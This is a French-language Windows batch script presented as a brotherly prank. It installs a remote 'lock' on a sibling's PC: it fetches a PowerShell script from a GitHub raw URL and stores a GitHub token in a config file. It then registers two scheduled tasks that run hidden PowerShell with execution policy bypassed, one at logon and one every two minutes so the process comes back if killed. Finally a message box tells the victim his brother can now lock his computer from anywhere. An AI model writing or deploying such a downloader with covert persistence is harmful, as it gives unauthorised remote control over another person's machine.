@echo off
:: ================================================================
:: BLAGUE VERROU — Installation
:: A PERSONNALISER avant d'envoyer :
::   - GITHUB_TOKEN  : ton token GitHub (contents r/w)
::   - CODE_SECRET   : le code que ton frere devra saisir pour se liberer
:: ================================================================

set TOKEN=REMPLACER_PAR_TON_TOKEN_GITHUB
set CODE=REMPLACER_PAR_TON_CODE_SECRET
set DOSSIER=%APPDATA%\BlagueVerrou
set SCRIPT_URL=https://raw.githubusercontent.com/thesangu/Aventuuuure/claude/signature-prank-replace-xhom2n/tools/blague_lock_windows.ps1
set PS=%DOSSIER%\blague_lock_windows.ps1

:: Creer le dossier
mkdir "%DOSSIER%" 2>nul

:: Telecharger le script PowerShell depuis GitHub
curl -s -L "%SCRIPT_URL%" -o "%PS%"
if not exist "%PS%" (
    powershell -Command "Invoke-WebRequest '%SCRIPT_URL%' -OutFile '%PS%'"
)

:: Ecrire la config JSON
powershell -Command "$c = [ordered]@{token='%TOKEN%';owner='thesangu';repo='Aventuuuure';branch='main';lock_path='data/blague_lock.json';code_secret='%CODE%'}; $c | ConvertTo-Json -Compress | Set-Content -Encoding UTF8 '%DOSSIER%\blague_config.json'"

:: Tache planifiee au demarrage (persistance)
schtasks /create /tn "BlagueVerrou" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%PS%\"" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1

:: Tache toutes les 2 minutes (remplace le gardien si process tue)
schtasks /create /tn "BlagueVerrouGardien" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%PS%\"" /sc minute /mo 2 /ru "%USERNAME%" /f >nul 2>&1

:: Lancer immediatement en arriere-plan
start "" /b powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS%"

:: Message de bienvenue pour le frere
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Bienvenue dans la matrice.`n`nTon grand frere peut desormais bloquer ton PC quand il veut, depuis n''importe ou.`n`nScore actuel : 2 - 1.`n`nA toi de jouer... si tu peux.', 'Trop tard. 😊', 'OK', 'Information') | Out-Null"
